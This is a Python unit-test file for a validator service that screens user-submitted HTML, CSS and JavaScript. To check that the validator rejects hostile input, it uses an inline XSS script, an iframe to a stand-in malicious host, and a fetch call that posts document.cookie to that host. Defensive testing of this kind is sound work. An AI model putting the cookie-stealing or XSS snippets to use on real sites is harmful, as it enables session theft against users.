"""
Unit tests for WebToy validator service
"""

import pytest

from services.validator import WebToyValidator


@pytest.mark.unit
class TestWebToyValidator:
    """Test cases for WebToy validator"""

    def test_validator_initialization(self, validator_service):
        """Test validator initialization"""
        assert isinstance(validator_service, WebToyValidator)

    def test_validate_valid_code(self, validator_service, sample_webtoy_code):
        """Test validating valid WebToy code"""
        result = validator_service.validate(sample_webtoy_code)
        assert result.is_valid
        assert not result.issues
        assert result.sanitized_code == sample_webtoy_code

    def test_validate_missing_required_fields(self, validator_service):
        """Test validating code with missing required fields"""
        # Missing JS field
        invalid_code = {"html": "<canvas></canvas>", "css": "body { margin: 0; }"}
        result = validator_service.validate(invalid_code)
        assert not result.is_valid
        assert "Missing required field: js" in result.issues

    def test_validate_unsafe_html(self, validator_service):
        """Test validating code with unsafe HTML"""
        unsafe_code = {
            "html": """<canvas></canvas>
                <script>alert('XSS')</script>
                <iframe src="http://malicious.example.com"></iframe>""",
            "css": "body { margin: 0; }",
            "js": "console.log('Hello');",
        }
        result = validator_service.validate(unsafe_code)
        assert not result.is_valid
        assert any("Unsafe HTML element" in issue for issue in result.issues)

    def test_validate_unsafe_js(self, validator_service):
        """Test validating code with unsafe JavaScript"""
        unsafe_js_code = {
            "html": "<canvas></canvas>",
            "css": "body { margin: 0; }",
            "js": "fetch('http://malicious.example.com/steal', { method: 'POST', body: document.cookie });",
        }
        result = validator_service.validate(unsafe_js_code)
        assert not result.is_valid
        assert any("Unsafe JavaScript" in issue for issue in result.issues)

    def test_sanitize_code(self, validator_service):
        """Test code sanitization"""
        code_with_comments = {
            "html": "<canvas></canvas>",
            "css": "/* Some comment */ body { margin: 0; }",
            "js": "// User tracking code\nconsole.log('Hello'); // Another comment",
        }
        result = validator_service.validate(code_with_comments)
        assert result.is_valid
        # Check if comments are removed/sanitized
        assert "// User tracking code" not in result.sanitized_code["js"]
        assert "// Another comment" not in result.sanitized_code["js"]

    def test_validate_css_with_external_resources(self, validator_service):
        """Test validating CSS with external resources"""
        css_with_external = {
            "html": "<canvas></canvas>",
            "css": "@import url('https://example.com/style.css'); body { background: url('https://example.com/bg.jpg'); }",
            "js": "console.log('Hello');",
        }
        result = validator_service.validate(css_with_external)
        assert not result.is_valid
        assert any("External CSS resource" in issue for issue in result.issues)
